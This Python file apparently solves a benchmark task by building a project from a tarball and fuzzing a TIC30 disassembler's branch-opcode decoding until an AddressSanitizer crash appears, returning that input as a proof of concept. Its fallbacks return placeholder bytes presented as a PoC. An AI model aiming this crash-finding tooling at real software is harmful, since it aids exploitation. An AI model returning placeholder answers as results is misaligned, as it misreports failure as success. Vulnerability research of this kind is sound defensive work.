import os
import tarfile
import tempfile
import subprocess
import time
import random
import re
import shutil


class Solution:
    class Runner:
        def __init__(self, kind: str, path: str, cwd: str):
            self.kind = kind  # 'script', 'bin_arg', 'bin_stdin'
            self.path = path
            self.cwd = cwd
            # Input file used when passing filename argument
            self.input_path = os.path.join(cwd, '__poc_input__')

        def run(self, data: bytes):
            if self.kind in ('script', 'bin_arg'):
                try:
                    with open(self.input_path, 'wb') as f:
                        f.write(data)
                except Exception:
                    # If we cannot write input file, treat as failure
                    raise
            try:
                if self.kind == 'script':
                    cmd = ['bash', self.path, self.input_path]
                    res = subprocess.run(
                        cmd,
                        cwd=self.cwd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        timeout=5,
                    )
                elif self.kind == 'bin_arg':
                    cmd = [self.path, self.input_path]
                    res = subprocess.run(
                        cmd,
                        cwd=self.cwd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        timeout=5,
                    )
                elif self.kind == 'bin_stdin':
                    cmd = [self.path]
                    res = subprocess.run(
                        cmd,
                        cwd=self.cwd,
                        input=data,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        timeout=5,
                    )
                else:
                    raise RuntimeError("Unknown runner kind")
            except subprocess.TimeoutExpired as e:
                raise
            return res.returncode, res.stdout, res.stderr

    def solve(self, src_path: str) -> bytes:
        try:
            return self._solve_internal(src_path)
        except Exception:
            # Fallback deterministic PoC if anything goes wrong
            return b'A' * 10

    def _solve_internal(self, src_path: str) -> bytes:
        random.seed(0)
        root, tmpdir = self._extract_tarball(src_path)
        try:
            self._build_project(root)
            runner = self._create_runner(root)
            if runner is None:
                return b'B' * 10
            poc = self._find_poc(root, runner)
            return poc
        finally:
            try:
                shutil.rmtree(tmpdir)
            except Exception:
                pass

    def _extract_tarball(self, src_path: str):
        tmpdir = tempfile.mkdtemp(prefix="pocgen_")
        with tarfile.open(src_path, 'r:*') as tar:
            safe_members = []
            for m in tar.getmembers():
                name = m.name
                if not name:
                    continue
                if name.startswith("/") or ".." in name or "\\\\" in name or name.startswith(".."):
                    continue
                safe_members.append(m)
            tar.extractall(tmpdir, members=safe_members)
        subdirs = [
            os.path.join(tmpdir, d)
            for d in os.listdir(tmpdir)
            if os.path.isdir(os.path.join(tmpdir, d))
        ]
        if len(subdirs) == 1:
            root = subdirs[0]
        else:
            root = tmpdir
        return root, tmpdir

    def _find_file(self, root: str, filename: str):
        for dirpath, dirnames, filenames in os.walk(root):
            if filename in filenames:
                return os.path.join(dirpath, filename)
        return None

    def _find_executable(self, root: str):
        for dirpath, dirnames, filenames in os.walk(root):
            for name in filenames:
                path = os.path.join(dirpath, name)
                if not os.path.isfile(path):
                    continue
                lower = name.lower()
                if lower.endswith(('.sh', '.py', '.pl', '.txt', '.md', '.rst')):
                    continue
                if os.access(path, os.X_OK):
                    return path
        return None

    def _build_project(self, root: str):
        build_sh = self._find_file(root, 'build.sh')
        if build_sh is not None:
            try:
                subprocess.run(
                    ['bash', build_sh],
                    cwd=os.path.dirname(build_sh),
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=600,
                )
                return
            except Exception:
                pass
        # Fallbacks: try common build systems, but ignore failures
        try:
            if os.path.exists(os.path.join(root, 'configure')):
                try:
                    subprocess.run(
                        ['bash', 'configure'],
                        cwd=root,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        timeout=600,
                    )
                    subprocess.run(
                        ['make', '-j4'],
                        cwd=root,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        timeout=600,
                    )
                    return
                except Exception:
                    pass
            if os.path.exists(os.path.join(root, 'CMakeLists.txt')):
                bdir = os.path.join(root, 'build_poc')
                os.makedirs(bdir, exist_ok=True)
                try:
                    subprocess.run(
                        ['cmake', '..'],
                        cwd=bdir,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        timeout=600,
                    )
                    subprocess.run(
                        ['make', '-j4'],
                        cwd=bdir,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        timeout=600,
                    )
                    return
                except Exception:
                    pass
            if os.path.exists(os.path.join(root, 'Makefile')):
                try:
                    subprocess.run(
                        ['make', '-j4'],
                        cwd=root,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        timeout=600,
                    )
                    return
                except Exception:
                    pass
        except Exception:
            pass

    def _create_runner(self, root: str):
        run_sh = self._find_file(root, 'run.sh')
        if run_sh is not None:
            return Solution.Runner('script', run_sh, os.path.dirname(run_sh))
        exe = self._find_executable(root)
        if exe is not None:
            return Solution.Runner('bin_arg', exe, os.path.dirname(exe))
        return None

    def _estimate_inst_bytes(self, tic30_path: str) -> int:
        try:
            with open(tic30_path, 'r', encoding='latin1') as f:
                txt = f.read()
        except Exception:
            return 4
        sizes = []
        for m in re.finditer(
            r'read_memory_func[^\n]*\([^,]+,\s*[^,]+,\s*([0-9]+)\s*,', txt
        ):
            try:
                val = int(m.group(1))
                if val > 0:
                    sizes.append(val)
            except Exception:
                pass
        if sizes:
            s = min(sizes)
            if 0 < s <= 16:
                return s
        return 4

    def _get_branch_entries(self, tic30_path: str):
        try:
            with open(tic30_path, 'r', encoding='latin1') as f:
                txt = f.read()
        except Exception:
            return []
        entries = []
        # Find initializer blocks containing print_branch
        for m in re.finditer(r'\{[^{}]*print_branch[^{}]*\}', txt, re.DOTALL):
            block = m.group(0)
            hexnums = re.findall(r'0x[0-9A-Fa-f]+', block)
            if not hexnums:
                continue
            try:
                opcode = int(hexnums[0], 16)
            except Exception:
                continue
            mask = None
            if len(hexnums) >= 2:
                try:
                    mask = int(hexnums[1], 16)
                except Exception:
                    mask = None
            entries.append((opcode, mask))
        return entries

    def _build_payload_from_opcode(
        self, opcode: int, mask: int, inst_bytes: int, total_len: int
    ) -> bytes:
        if inst_bytes <= 0:
            inst_bytes = 4
        width = inst_bytes * 8
        if width <= 0:
            width = max(8, opcode.bit_length(), (mask or 0).bit_length())
        mod = (1 << width) - 1
        opcode &= mod
        if mask is not None:
            mask &= mod
            dont = (~mask) & mod
            rand = random.getrandbits(width) & dont
            inst = (opcode & mask) | rand
        else:
            inst = opcode & mod
        inst &= mod
        try:
            b_le = inst.to_bytes(inst_bytes, byteorder='little', signed=False)
            b_be = inst.to_bytes(inst_bytes, byteorder='big', signed=False)
        except OverflowError:
            inst &= (1 << (inst_bytes * 8)) - 1
            b_le = inst.to_bytes(inst_bytes, byteorder='little', signed=False)
            b_be = inst.to_bytes(inst_bytes, byteorder='big', signed=False)
        choice = random.choice([b_le, b_be])
        if len(choice) >= total_len:
            payload = choice[:total_len]
        else:
            tail_len = total_len - len(choice)
            payload = choice + os.urandom(tail_len)
        # Light random mutations
        arr = bytearray(payload)
        mutate_count = random.randint(0, 2)
        for _ in range(mutate_count):
            if not arr:
                break
            idx = random.randrange(len(arr))
            arr[idx] ^= 1 << random.randrange(8)
        return bytes(arr)

    def _test_input(self, runner: "Solution.Runner", data: bytes) -> bool:
        try:
            rc, out, err = runner.run(data)
        except subprocess.TimeoutExpired:
            return False
        except Exception:
            return False
        if rc == 0:
            return False
        # Negative return code -> terminated by signal: treat as crash.
        if rc < 0:
            return True
        if err:
            if (
                b'AddressSanitizer' in err
                or b'stack-buffer-overflow' in err
                or b'heap-buffer-overflow' in err
                or b'Sanitizer' in err
            ):
                return True
        return False

    def _fuzz_targeted(
        self,
        runner: "Solution.Runner",
        inst_bytes: int,
        entries,
        budget: int,
        total_len: int = 10,
    ):
        if not entries or budget <= 0:
            return None
        n = len(entries)
        for i in range(budget):
            opcode, mask = entries[i % n]
            data = self._build_payload_from_opcode(opcode, mask, inst_bytes, total_len)
            if self._test_input(runner, data):
                return data
        return None

    def _fuzz_random(
        self, runner: "Solution.Runner", budget: int, total_len: int = 10
    ):
        if budget <= 0:
            return None
        for _ in range(budget):
            data = os.urandom(total_len)
            if self._test_input(runner, data):
                return data
        return None

    def _find_poc(self, root: str, runner: "Solution.Runner") -> bytes:
        tic30_path = self._find_file(root, 'tic30-dis.c')
        if tic30_path is None:
            # No specific file found, simple random fuzz with fixed budget
            poc = self._fuzz_random(runner, budget=5000, total_len=10)
            if poc is not None:
                return poc
            return b'C' * 10

        inst_bytes = self._estimate_inst_bytes(tic30_path)
        entries = self._get_branch_entries(tic30_path)

        # Calibration: estimate average run time
        calib_inputs = [os.urandom(10) for _ in range(3)]
        start = time.time()
        for data in calib_inputs:
            if self._test_input(runner, data):
                return data
        elapsed = time.time() - start
        avg = elapsed / max(1, len(calib_inputs))
        if avg <= 0:
            avg = 0.005
        # Total fuzzing time budget ~40 seconds
        max_runs = int(40.0 / avg)
        if max_runs < 2000:
            max_runs = 2000
        if max_runs > 50000:
            max_runs = 50000

        targeted_budget = int(max_runs * 0.7) if entries else 0
        random_budget = max_runs - targeted_budget

        if targeted_budget > 0:
            poc = self._fuzz_targeted(
                runner, inst_bytes, entries, targeted_budget, total_len=10
            )
            if poc is not None:
                return poc
        if random_budget > 0:
            poc = self._fuzz_random(runner, random_budget, total_len=10)
            if poc is not None:
                return poc
        # As a last resort, provide deterministic non-empty PoC
        return b'D' * 10
